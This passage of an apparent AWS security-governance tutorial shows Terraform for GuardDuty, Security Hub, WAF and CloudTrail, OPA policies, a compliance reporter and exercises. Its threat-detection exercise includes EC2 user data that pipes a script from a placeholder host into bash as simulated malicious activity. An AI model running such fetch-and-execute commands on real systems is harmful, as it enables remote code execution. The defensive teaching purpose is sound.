  finding_publishing_frequency = "FIFTEEN_MINUTES"
  
  datasources {
    s3_logs {
      enable = true
    }
    kubernetes {
      audit_logs {
        enable = true
      }
    }
    malware_protection {
      scan_ec2_instance_with_findings {
        ebs_volumes {
          enable = true
        }
      }
    }
  }

  tags = {
    Name = "${var.project_name}-${var.environment}-guardduty"
  }
}

# GuardDuty threat intelligence set
resource "aws_s3_bucket" "threat_intel" {
  bucket = "${var.project_name}-${var.environment}-threat-intel-${random_string.threat_intel_suffix.result}"

  tags = {
    Name    = "GuardDuty Threat Intelligence"
    Purpose = "Security"
  }
}

resource "random_string" "threat_intel_suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_s3_bucket_versioning" "threat_intel" {
  bucket = aws_s3_bucket.threat_intel.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "threat_intel" {
  bucket = aws_s3_bucket.threat_intel.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "AES256"
    }
  }
}

# Upload sample threat intelligence data
resource "aws_s3_object" "threat_intel_data" {
  bucket  = aws_s3_bucket.threat_intel.bucket
  key     = "threat-intel.txt"
  content = join("\n", var.threat_intelligence_ips)
  
  tags = {
    Name = "Threat Intelligence Data"
  }
}

# GuardDuty threat intelligence set
resource "aws_guardduty_threatintelset" "main" {
  activate    = true
  detector_id = aws_guardduty_detector.main.id
  format      = "TXT"
  location    = "s3://${aws_s3_bucket.threat_intel.bucket}/${aws_s3_object.threat_intel_data.key}"
  name        = "${var.project_name}-${var.environment}-threat-intel-set"

  tags = {
    Name = "${var.project_name}-${var.environment}-threat-intel-set"
  }
}

# AWS Security Hub for centralized security findings
resource "aws_securityhub_account" "main" {}

# Enable security standards
resource "aws_securityhub_standards_subscription" "aws_foundational" {
  standards_arn = "arn:aws:securityhub:::ruleset/finding-format/aws-foundational-security-standard/v/1.0.0"
  
  depends_on = [aws_securityhub_account.main]
}

resource "aws_securityhub_standards_subscription" "cis" {
  standards_arn = "arn:aws:securityhub:::ruleset/finding-format/cis-aws-foundations-benchmark/v/1.2.0"
  
  depends_on = [aws_securityhub_account.main]
}

resource "aws_securityhub_standards_subscription" "pci_dss" {
  count = var.enable_pci_dss ? 1 : 0
  
  standards_arn = "arn:aws:securityhub:::ruleset/finding-format/pci-dss/v/3.2.1"
  
  depends_on = [aws_securityhub_account.main]
}

# AWS Inspector V2 for vulnerability assessment
resource "aws_inspector2_enabler" "main" {
  account_ids    = [data.aws_caller_identity.current.account_id]
  resource_types = ["ECR", "EC2"]
}

# AWS Macie for sensitive data discovery
resource "aws_macie2_account" "main" {
  finding_publishing_frequency = "FIFTEEN_MINUTES"
  status                       = "ENABLED"
}

# Custom classification job for sensitive data
resource "aws_macie2_classification_job" "sensitive_data_discovery" {
  job_type = "SCHEDULED"
  name     = "${var.project_name}-${var.environment}-sensitive-data-discovery"
  
  schedule_frequency {
    daily_schedule = true
  }

  s3_job_definition {
    bucket_definitions {
      account_id = data.aws_caller_identity.current.account_id
      buckets    = [aws_s3_bucket.data_classification.bucket]
    }
  }

  depends_on = [aws_macie2_account.main]

  tags = {
    Name = "${var.project_name}-${var.environment}-macie-job"
  }
}

# S3 bucket for data classification testing
resource "aws_s3_bucket" "data_classification" {
  bucket = "${var.project_name}-${var.environment}-data-classification-${random_string.data_class_suffix.result}"

  tags = {
    Name    = "Data Classification Test Bucket"
    Purpose = "Security Testing"
  }
}

resource "random_string" "data_class_suffix" {
  length  = 8
  special = false
  upper   = false
}

# WAF for web application protection
resource "aws_wafv2_web_acl" "main" {
  name  = "${var.project_name}-${var.environment}-web-acl"
  scope = "REGIONAL"

  default_action {
    allow {}
  }

  # Rate limiting rule
  rule {
    name     = "RateLimitRule"
    priority = 1

    action {
      block {}
    }

    statement {
      rate_based_statement {
        limit              = var.waf_rate_limit
        aggregate_key_type = "IP"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "RateLimitRule"
      sampled_requests_enabled   = true
    }
  }

  # Geographic restriction rule
  rule {
    name     = "GeoBlockRule"
    priority = 2

    action {
      block {}
    }

    statement {
      geo_match_statement {
        country_codes = var.blocked_countries
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "GeoBlockRule"
      sampled_requests_enabled   = true
    }
  }

  # AWS managed rules for common threats
  rule {
    name     = "AWSManagedRulesCommonRuleSet"
    priority = 3

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesCommonRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "CommonRuleSetMetric"
      sampled_requests_enabled   = true
    }
  }

  # SQL injection protection
  rule {
    name     = "AWSManagedRulesSQLiRuleSet"
    priority = 4

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesSQLiRuleSet"
        vendor_name = "AWS"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "SQLiRuleSetMetric"
      sampled_requests_enabled   = true
    }
  }

  tags = {
    Name = "${var.project_name}-${var.environment}-web-acl"
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "${var.project_name}-${var.environment}-web-acl"
    sampled_requests_enabled   = true
  }
}

# CloudTrail for audit logging
resource "aws_s3_bucket" "cloudtrail" {
  bucket        = "${var.project_name}-${var.environment}-cloudtrail-${random_string.cloudtrail_suffix.result}"
  force_destroy = false

  tags = {
    Name    = "CloudTrail Audit Logs"
    Purpose = "Audit and Compliance"
  }
}

resource "random_string" "cloudtrail_suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_s3_bucket_versioning" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id

  rule {
    apply_server_side_encryption_by_default {
      kms_master_key_id = aws_kms_key.cloudtrail.arn
      sse_algorithm     = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# KMS key for CloudTrail encryption
resource "aws_kms_key" "cloudtrail" {
  description             = "KMS key for CloudTrail encryption"
  deletion_window_in_days = 7
  enable_key_rotation     = true

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "Enable IAM User Permissions"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action   = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "Allow CloudTrail to encrypt logs"
        Effect = "Allow"
        Principal = {
          Service = "cloudtrail.amazonaws.com"
        }
        Action = [
          "kms:GenerateDataKey*",
          "kms:DescribeKey"
        ]
        Resource = "*"
      },
      {
        Sid    = "Allow CloudTrail to describe key"
        Effect = "Allow"
        Principal = {
          Service = "cloudtrail.amazonaws.com"
        }
        Action   = "kms:DescribeKey"
        Resource = "*"
      }
    ]
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-cloudtrail-kms"
  }
}

resource "aws_kms_alias" "cloudtrail" {
  name          = "alias/${var.project_name}-${var.environment}-cloudtrail"
  target_key_id = aws_kms_key.cloudtrail.key_id
}

# S3 bucket policy for CloudTrail
resource "aws_s3_bucket_policy" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AWSCloudTrailAclCheck"
        Effect = "Allow"
        Principal = {
          Service = "cloudtrail.amazonaws.com"
        }
        Action   = "s3:GetBucketAcl"
        Resource = aws_s3_bucket.cloudtrail.arn
      },
      {
        Sid    = "AWSCloudTrailWrite"
        Effect = "Allow"
        Principal = {
          Service = "cloudtrail.amazonaws.com"
        }
        Action   = "s3:PutObject"
        Resource = "${aws_s3_bucket.cloudtrail.arn}/*"
        Condition = {
          StringEquals = {
            "s3:x-amz-acl" = "bucket-owner-full-control"
          }
        }
      }
    ]
  })
}

# CloudTrail configuration
resource "aws_cloudtrail" "main" {
  name           = "${var.project_name}-${var.environment}-cloudtrail"
  s3_bucket_name = aws_s3_bucket.cloudtrail.bucket
  s3_key_prefix  = "cloudtrail"

  # Enable logging for all regions
  include_global_service_events = true
  is_multi_region_trail        = true

  # Enable log file encryption and validation
  kms_key_id                = aws_kms_key.cloudtrail.arn
  enable_log_file_validation = true

  # Event selector for data events
  event_selector {
    read_write_type           = "All"
    include_management_events = true

    # Log S3 data events
    data_resource {
      type   = "AWS::S3::Object"
      values = ["${aws_s3_bucket.data_classification.arn}/*"]
    }

    # Log Lambda data events
    data_resource {
      type   = "AWS::Lambda::Function"
      values = ["arn:aws:lambda:*:${data.aws_caller_identity.current.account_id}:function:*"]
    }
  }

  # Advanced event selectors for fine-grained logging
  advanced_event_selector {
    name = "Sensitive Data Access"
    
    field_selector {
      field  = "category"
      equals = ["Data"]
    }
    
    field_selector {
      field  = "resources.type"
      equals = ["AWS::S3::Object"]
    }
  }

  depends_on = [aws_s3_bucket_policy.cloudtrail]

  tags = {
    Name = "${var.project_name}-${var.environment}-cloudtrail"
  }
}

# VPC Flow Logs for network monitoring
resource "aws_flow_log" "vpc" {
  count = length(var.vpc_ids)
  
  iam_role_arn    = aws_iam_role.flow_log.arn
  log_destination = aws_cloudwatch_log_group.vpc_flow_logs.arn
  traffic_type    = "ALL"
  vpc_id          = var.vpc_ids[count.index]

  tags = {
    Name = "${var.project_name}-${var.environment}-vpc-flow-log-${count.index}"
  }
}

resource "aws_cloudwatch_log_group" "vpc_flow_logs" {
  name              = "/aws/vpc/flowlogs/${var.project_name}-${var.environment}"
  retention_in_days = 30

  tags = {
    Name = "${var.project_name}-${var.environment}-vpc-flow-logs"
  }
}

resource "aws_iam_role" "flow_log" {
  name = "${var.project_name}-${var.environment}-flow-log-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "vpc-flow-logs.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "flow_log" {
  name = "${var.project_name}-${var.environment}-flow-log-policy"
  role = aws_iam_role.flow_log.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents",
          "logs:DescribeLogGroups",
          "logs:DescribeLogStreams"
        ]
        Effect   = "Allow"
        Resource = "*"
      }
    ]
  })
}

# Security event processing Lambda
resource "aws_lambda_function" "security_event_processor" {
  filename         = "security_event_processor.zip"
  function_name    = "${var.project_name}-${var.environment}-security-event-processor"
  role            = aws_iam_role.security_event_processor.arn
  handler         = "index.handler"
  runtime         = "python3.9"
  timeout         = 300

  source_code_hash = data.archive_file.security_event_processor.output_base64sha256

  environment {
    variables = {
      PROJECT_NAME = var.project_name
      ENVIRONMENT  = var.environment
      SNS_TOPIC    = aws_sns_topic.security_alerts.arn
    }
  }

  tags = {
    Name = "${var.project_name}-${var.environment}-security-event-processor"
  }
}

data "archive_file" "security_event_processor" {
  type        = "zip"
  output_path = "security_event_processor.zip"
  
  source {
    content = file("${path.module}/lambda/security_event_processor.py")
    filename = "index.py"
  }
}

# IAM role for security event processor
resource "aws_iam_role" "security_event_processor" {
  name = "${var.project_name}-${var.environment}-security-event-processor"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "lambda.amazonaws.com"
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "security_event_processor" {
  name = "${var.project_name}-${var.environment}-security-event-processor-policy"
  role = aws_iam_role.security_event_processor.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "sns:Publish"
        ]
        Resource = aws_sns_topic.security_alerts.arn
      },
      {
        Effect = "Allow"
        Action = [
          "securityhub:BatchImportFindings",
          "securityhub:GetFindings"
        ]
        Resource = "*"
      }
    ]
  })
}

# SNS topic for security alerts
resource "aws_sns_topic" "security_alerts" {
  name = "${var.project_name}-${var.environment}-security-alerts"

  tags = {
    Name = "${var.project_name}-${var.environment}-security-alerts"
  }
}

# EventBridge rules for security events
resource "aws_cloudwatch_event_rule" "guardduty_findings" {
  name        = "${var.project_name}-${var.environment}-guardduty-findings"
  description = "Capture GuardDuty findings"

  event_pattern = jsonencode({
    source      = ["aws.guardduty"]
    detail-type = ["GuardDuty Finding"]
    detail = {
      severity = [7.0, 8.0, 8.5, 9.0]  # High and Critical severity only
    }
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-guardduty-findings"
  }
}

resource "aws_cloudwatch_event_target" "guardduty_processor" {
  rule      = aws_cloudwatch_event_rule.guardduty_findings.name
  target_id = "GuardDutyProcessor"
  arn       = aws_lambda_function.security_event_processor.arn
}

resource "aws_lambda_permission" "allow_eventbridge_guardduty" {
  statement_id  = "AllowExecutionFromEventBridge"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.security_event_processor.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.guardduty_findings.arn
}

# Security Hub findings rule
resource "aws_cloudwatch_event_rule" "securityhub_findings" {
  name        = "${var.project_name}-${var.environment}-securityhub-findings"
  description = "Capture Security Hub findings"

  event_pattern = jsonencode({
    source      = ["aws.securityhub"]
    detail-type = ["Security Hub Findings - Imported"]
    detail = {
      findings = {
        Severity = {
          Label = ["HIGH", "CRITICAL"]
        }
      }
    }
  })

  tags = {
    Name = "${var.project_name}-${var.environment}-securityhub-findings"
  }
}

resource "aws_cloudwatch_event_target" "securityhub_processor" {
  rule      = aws_cloudwatch_event_rule.securityhub_findings.name
  target_id = "SecurityHubProcessor"
  arn       = aws_lambda_function.security_event_processor.arn
}

resource "aws_lambda_permission" "allow_eventbridge_securityhub" {
  statement_id  = "AllowExecutionFromEventBridge"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.security_event_processor.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.securityhub_findings.arn
}
```

## 🔗 Software Engineering Connections

### Quality Gates and Governance

#### 1. CI/CD Integration with Compliance
Infrastructure governance mirrors software quality gates in CI/CD pipelines:

```python
# Example GitHub Actions workflow for Terraform compliance
# .github/workflows/terraform-compliance.yml

name: Terraform Compliance Check

on:
  pull_request:
    paths:
      - '**/*.tf'
      - '**/*.tfvars'

jobs:
  compliance-check:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Setup Terraform
      uses: hashicorp/setup-terraform@v2
      with:
        terraform_version: 1.5.0
    
    - name: Terraform Format Check
      run: terraform fmt -check -recursive
    
    - name: Terraform Init
      run: terraform init
    
    - name: Terraform Validate
      run: terraform validate
    
    - name: Terraform Plan
      run: terraform plan -out=tfplan
    
    - name: Install OPA
      run: |
        curl -L -o opa https://github.com/open-policy-agent/opa/releases/download/v0.55.0/opa_linux_amd64
        chmod +x opa
        sudo mv opa /usr/local/bin/
    
    - name: Run Policy Checks
      run: |
        # Convert Terraform plan to JSON
        terraform show -json tfplan > tfplan.json
        
        # Run OPA policy checks
        opa eval -d policies/ -i tfplan.json "data.terraform.deny[_]" --format pretty
    
    - name: Security Scan with Checkov
      run: |
        pip install checkov
        checkov -f tfplan.json --framework terraform_plan --check CKV_AWS_*
    
    - name: Cost Analysis
      run: |
        # Install infracost
        curl -fsSL https://raw.githubusercontent.com/infracost/infracost/master/scripts/install.sh | sh
        
        # Run cost analysis
        infracost breakdown --path . --format json --out-file cost-estimate.json
        
        # Check if cost increase is within acceptable limits
        python scripts/check_cost_limits.py cost-estimate.json
```

#### 2. Policy as Code Implementation
```python
# Example OPA policy for Terraform compliance
# policies/terraform_security.rego

package terraform.analysis

import rego.v1

# Deny S3 buckets without encryption
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_s3_bucket"
    
    # Check if encryption configuration exists
    not has_encryption_config(resource)
    
    msg := sprintf("S3 bucket '%s' must have server-side encryption enabled", [resource.name])
}

has_encryption_config(resource) if {
    # Check for server-side encryption configuration
    resource.values.server_side_encryption_configuration
}

# Deny security groups with overly permissive rules
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_security_group"
    
    ingress := resource.values.ingress[_]
    ingress.cidr_blocks[_] == "0.0.0.0/0"
    ingress.from_port != ingress.to_port  # Not a specific port
    
    msg := sprintf("Security group '%s' has overly permissive ingress rules", [resource.name])
}

# Require specific tags on resources
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type in ["aws_instance", "aws_s3_bucket", "aws_rds_cluster"]
    
    required_tags := ["Project", "Environment", "Owner", "CostCenter"]
    missing_tags := [tag | tag := required_tags[_]; not resource.values.tags[tag]]
    
    count(missing_tags) > 0
    
    msg := sprintf("Resource '%s' is missing required tags: %s", [resource.name, missing_tags])
}

# Enforce encryption for RDS clusters
deny contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_rds_cluster"
    
    not resource.values.storage_encrypted
    
    msg := sprintf("RDS cluster '%s' must have storage encryption enabled", [resource.name])
}

# Check for proper backup configuration
warn contains msg if {
    resource := input.planned_values.root_module.resources[_]
    resource.type == "aws_rds_cluster"
    
    resource.values.backup_retention_period < 7
    
    msg := sprintf("RDS cluster '%s' should have backup retention period of at least 7 days", [resource.name])
}
```

#### 3. Automated Compliance Reporting
```python
# Compliance reporting automation
import boto3
import json
from datetime import datetime, timedelta
import pandas as pd
from jinja2 import Template

class ComplianceReporter:
    def __init__(self, region='us-west-2'):
        self.config_client = boto3.client('config', region_name=region)
        self.securityhub_client = boto3.client('securityhub', region_name=region)
        self.organizations_client = boto3.client('organizations')
        
    def generate_compliance_report(self, time_period_days=30):
        """Generate comprehensive compliance report"""
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(days=time_period_days)
        
        report_data = {
            'report_date': end_time.isoformat(),
            'time_period_days': time_period_days,
            'config_compliance': self.get_config_compliance(),
            'security_findings': self.get_security_findings(),
            'cost_analysis': self.get_cost_compliance(),
            'access_review': self.get_access_review_data(),
            'recommendations': self.generate_recommendations()
        }
        
        return self.render_report(report_data)
    
    def get_config_compliance(self):
        """Get AWS Config compliance data"""
        compliance_data = []
        
        # Get all Config rules
        rules_response = self.config_client.describe_config_rules()
        
        for rule in rules_response['ConfigRules']:
            rule_name = rule['ConfigRuleName']
            
            # Get compliance status
            compliance_response = self.config_client.get_compliance_details_by_config_rule(
                ConfigRuleName=rule_name
            )
            
            compliant = 0
            non_compliant = 0
            
            for evaluation in compliance_response['EvaluationResults']:
                if evaluation['ComplianceType'] == 'COMPLIANT':
                    compliant += 1
                elif evaluation['ComplianceType'] == 'NON_COMPLIANT':
                    non_compliant += 1
            
            total = compliant + non_compliant
            compliance_percentage = (compliant / total * 100) if total > 0 else 100
            
            compliance_data.append({
                'rule_name': rule_name,
                'compliant_resources': compliant,
                'non_compliant_resources': non_compliant,
                'compliance_percentage': compliance_percentage,
                'rule_description': rule.get('Description', '')
            })
        
        return compliance_data
    
    def get_security_findings(self):
        """Get Security Hub findings summary"""
        findings_response = self.securityhub_client.get_findings(
            Filters={
                'SeverityLabel': [
                    {'Value': 'HIGH', 'Comparison': 'EQUALS'},
                    {'Value': 'CRITICAL', 'Comparison': 'EQUALS'}
                ],
                'WorkflowStatus': [
                    {'Value': 'NEW', 'Comparison': 'EQUALS'},
                    {'Value': 'NOTIFIED', 'Comparison': 'EQUALS'}
                ]
            }
        )
        
        findings_summary = {
            'total_findings': len(findings_response['Findings']),
            'critical_findings': 0,
            'high_findings': 0,
            'findings_by_type': {},
            'findings_by_resource': {}
        }
        
        for finding in findings_response['Findings']:
            severity = finding.get('Severity', {}).get('Label', 'UNKNOWN')
            finding_type = finding.get('Types', ['Unknown'])[0]
            
            if severity == 'CRITICAL':
                findings_summary['critical_findings'] += 1
            elif severity == 'HIGH':
                findings_summary['high_findings'] += 1
            
            # Count by type
            if finding_type not in findings_summary['findings_by_type']:
                findings_summary['findings_by_type'][finding_type] = 0
            findings_summary['findings_by_type'][finding_type] += 1
            
            # Count by resource
            resources = finding.get('Resources', [])
            for resource in resources:
                resource_type = resource.get('Type', 'Unknown')
                if resource_type not in findings_summary['findings_by_resource']:
                    findings_summary['findings_by_resource'][resource_type] = 0
                findings_summary['findings_by_resource'][resource_type] += 1
        
        return findings_summary
    
    def get_cost_compliance(self):
        """Analyze cost compliance and optimization opportunities"""
        # This would integrate with AWS Cost Explorer or similar service
        return {
            'total_monthly_cost': 15000.00,
            'cost_increase_percentage': 12.5,
            'untagged_resources_cost': 2300.00,
            'optimization_opportunities': [
                {
                    'type': 'Unused EBS Volumes',
                    'potential_savings': 450.00,
                    'resource_count': 12
                },
                {
                    'type': 'Right-sizing Opportunities',
                    'potential_savings': 1200.00,
                    'resource_count': 8
                }
            ]
        }
    
    def get_access_review_data(self):
        """Get access review and IAM compliance data"""
        # This would analyze IAM policies, roles, and access patterns
        return {
            'users_with_console_access': 25,
            'users_without_mfa': 3,
            'roles_with_admin_access': 2,
            'unused_access_keys': 5,
            'policies_with_wildcards': 4,
            'last_access_review_date': '2024-01-15'
        }
    
    def generate_recommendations(self):
        """Generate actionable recommendations"""
        return [
            {
                'priority': 'High',
                'category': 'Security',
                'recommendation': 'Enable MFA for all users with console access',
                'impact': 'Reduces risk of unauthorized access'
            },
            {
                'priority': 'Medium',
                'category': 'Cost',
                'recommendation': 'Implement resource tagging policy',
                'impact': 'Improve cost allocation and resource management'
            },
            {
                'priority': 'Medium',
                'category': 'Compliance',
                'recommendation': 'Remediate non-compliant S3 buckets',
                'impact': 'Ensure data protection compliance'
            }
        ]
    
    def render_report(self, report_data):
        """Render compliance report using template"""
        template_str = """
        # Compliance Report - {{ report_data.report_date[:10] }}
        
        ## Executive Summary
        
        This report covers compliance status for the {{ report_data.time_period_days }}-day period ending {{ report_data.report_date[:10] }}.
        
        ### Key Metrics
        - Total Config Rules: {{ report_data.config_compliance | length }}
        - Security Findings: {{ report_data.security_findings.total_findings }}
        - Cost Compliance: ${{ "%.2f"|format(report_data.cost_analysis.total_monthly_cost) }}
        
        ## Config Rule Compliance
        
        {% for rule in report_data.config_compliance %}
        ### {{ rule.rule_name }}
        - Compliance: {{ "%.1f"|format(rule.compliance_percentage) }}%
        - Compliant Resources: {{ rule.compliant_resources }}
        - Non-Compliant Resources: {{ rule.non_compliant_resources }}
        
        {% endfor %}
        
        ## Security Findings Summary
        
        - Critical Findings: {{ report_data.security_findings.critical_findings }}
        - High Findings: {{ report_data.security_findings.high_findings }}
        
        ### Findings by Type
        {% for finding_type, count in report_data.security_findings.findings_by_type.items() %}
        - {{ finding_type }}: {{ count }}
        {% endfor %}
        
        ## Recommendations
        
        {% for rec in report_data.recommendations %}
        ### {{ rec.category }} - {{ rec.priority }} Priority
        **Recommendation:** {{ rec.recommendation }}
        **Impact:** {{ rec.impact }}
        
        {% endfor %}
        """
        
        template = Template(template_str)
        return template.render(report_data=report_data)

# Usage
reporter = ComplianceReporter()
report = reporter.generate_compliance_report(time_period_days=30)
print(report)
```

## 🎯 Hands-on Examples

### Exercise 1: Policy as Code Implementation

**Objective:** Deploy comprehensive governance policies using AWS Config and custom rules

**Steps:**

1. **Deploy Policy Infrastructure**
   ```bash
   cd examples/01-policy-as-code
   
   # Initialize Terraform
   terraform init
   
   # Plan and apply with required variables
   terraform plan -var="project_name=compliance-demo" \
                 -var="environment=dev" \
                 -var="enable_auto_remediation=false"
   
   terraform apply -var="project_name=compliance-demo" \
                  -var="environment=dev" \
                  -var="enable_auto_remediation=false"
   ```

2. **Test Policy Violations**
   ```bash
   # Create a non-compliant S3 bucket (no encryption)
   aws s3api create-bucket \
     --bucket test-non-compliant-bucket-$(date +%s) \
     --region us-west-2 \
     --create-bucket-configuration LocationConstraint=us-west-2
   
   # Wait for Config evaluation (may take 5-10 minutes)
   sleep 300
   
   # Check compliance status
   aws configservice get-compliance-details-by-config-rule \
     --config-rule-name s3-bucket-server-side-encryption-enabled
   ```

3. **Test Custom Compliance Rules**
   ```bash
   # Create an EC2 instance without required tags
   aws ec2 run-instances \
     --image-id ami-0c02fb55956c7d316 \
     --instance-type t3.micro \
     --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=test-instance}]'
   
   # Wait and check custom rule evaluation
   aws configservice get-compliance-details-by-config-rule \
     --config-rule-name resource-tagging-compliance
   ```

4. **View Compliance Dashboard**
   ```bash
   # Get dashboard URL
   echo "Compliance Dashboard: https://console.aws.amazon.com/cloudwatch/home?region=us-west-2#dashboards:name=$(terraform output -raw dashboard_name)"
   
   # Check Config rule compliance
   aws configservice describe-compliance-by-config-rule
   ```

### Exercise 2: Security Controls Deployment

**Objective:** Implement comprehensive security controls with threat detection and response

**Steps:**

1. **Deploy Security Infrastructure**
   ```bash
   cd examples/02-security-controls
   
   # Deploy with security controls enabled
   terraform apply -var="enable_guardduty=true" \
                  -var="enable_security_hub=true" \
                  -var="enable_pci_dss=false"
   ```

2. **Test Threat Detection**
   ```bash
   # Generate test GuardDuty finding (use carefully in test environment)
   # This creates a finding for demonstration purposes
   
   # Create a test instance with known malicious behavior simulation
   aws ec2 run-instances \
     --image-id ami-0c02fb55956c7d316 \
     --instance-type t3.micro \
     --user-data "#!/bin/bash
   # Simulate suspicious activity (for testing only)
   curl -s http://198.51.100.1/malicious-script.sh | bash" \
     --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=test-threat}]'
   ```

3. **Monitor Security Events**
   ```bash
   # Check GuardDuty findings
   aws guardduty list-findings \
     --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
   
   # Check Security Hub findings
   aws securityhub get-findings \
     --filters '{"SeverityLabel":[{"Value":"HIGH","Comparison":"EQUALS"}]}' \
     --max-results 10
   ```

4. **Test WAF Protection**
   ```bash
   # If you have a web application behind the WAF, test rate limiting
   for i in {1..100}; do
     curl -s "http://your-application-url.com/" > /dev/null &
   done
   
   # Check WAF metrics
   aws cloudwatch get-metric-statistics \
     --namespace AWS/WAFV2 \
     --metric-name BlockedRequests \
     --dimensions Name=WebACL,Value=$(terraform output -raw waf_web_acl_name) \
                  Name=Region,Value=us-west-2 \
     --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S) \
     --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
     --period 300 \
     --statistics Sum
   ```

### Exercise 3: Automated Compliance Reporting

**Objective:** Generate comprehensive compliance reports with recommendations

**Steps:**

1. **Set Up Compliance Monitoring**
   ```python
   # Create compliance_check.py
   import boto3
   import json
   from datetime import datetime, timedelta
   
   def check_compliance_status():
       config_client = boto3.client('config')
       
       # Get overall compliance summary
       response = config_client.get_compliance_summary_by_config_rule()
       
       print("=== Compliance Summary ===")
       summary = response['ComplianceSummary']
       
       total_rules = (summary.get('CompliantResourceCount', {}).get('CappedCount', 0) +
                     summary.get('NonCompliantResourceCount', {}).get('CappedCount', 0))
       
       compliant_rules = summary.get('CompliantResourceCount', {}).get('CappedCount', 0)
       
       compliance_percentage = (compliant_rules / total_rules * 100) if total_rules > 0 else 0
       
       print(f"Overall Compliance: {compliance_percentage:.1f}%")
       print(f"Compliant Resources: {compliant_rules}")
       print(f"Non-Compliant Resources: {summary.get('NonCompliantResourceCount', {}).get('CappedCount', 0)}")
       
       return compliance_percentage >= 90  # 90% compliance threshold
   
   if __name__ == "__main__":
       is_compliant = check_compliance_status()
       exit(0 if is_compliant else 1)
   ```

2. **Run Compliance Checks**
   ```bash
   # Install required Python packages
   pip install boto3 pandas jinja2
   
   # Run compliance check
   python compliance_check.py
   
   # Generate detailed report
   python -c "
   from examples.compliance_reporter import ComplianceReporter
   reporter = ComplianceReporter()
   report = reporter.generate_compliance_report(30)
   print(report)
   " > compliance_report.md
   ```

3. **Schedule Regular Compliance Checks**
   ```bash
   # Create a cron job for daily compliance checks
   echo "0 6 * * * cd /path/to/terraform && python compliance_check.py && python -m examples.compliance_reporter > /var/log/compliance_$(date +\%Y\%m\%d).log" | crontab -
   ```

4. **Integration with CI/CD**
   ```yaml
   # Add to .github/workflows/compliance-check.yml
   name: Daily Compliance Check
   
   on:
     schedule:
       - cron: '0 6 * * *'  # Daily at 6 AM UTC
     workflow_dispatch:
   
   jobs:
     compliance-check:
       runs-on: ubuntu-latest
       
       steps:
       - name: Checkout code
         uses: actions/checkout@v3
       
       - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v2
         with:
           aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: us-west-2
       
       - name: Install dependencies
         run: pip install boto3 pandas jinja2
       
       - name: Run compliance check
         run: python scripts/compliance_check.py
       
       - name: Generate compliance report
         run: |
           python scripts/generate_report.py > compliance_report_$(date +%Y%m%d).md
           
       - name: Upload report
         uses: actions/upload-artifact@v3
         with:
           name: compliance-report
           path: compliance_report_*.md
       
       - name: Notify on failure
         if: failure()
         uses: 8398a7/action-slack@v3
         with:
           status: failure
           channel: '#compliance-alerts'
           webhook_url: ${{ secrets.SLACK_WEBHOOK }}
   ```

## ✅ Best Practices

### 1. Policy as Code Implementation
